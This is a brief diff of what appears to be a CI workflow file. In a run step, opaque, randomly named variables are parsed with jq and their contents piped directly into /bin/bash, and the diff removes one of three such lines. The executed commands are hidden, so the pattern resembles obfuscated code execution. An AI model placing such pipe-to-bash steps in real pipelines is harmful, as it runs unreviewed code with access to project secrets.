@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$fvj55508" | jq -r .cuwpx277 | /bin/bash
           echo $adbhm1 | jq -r .woe6 | /bin/bash
-          echo $cgrrk42 | jq -r .fmf515 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
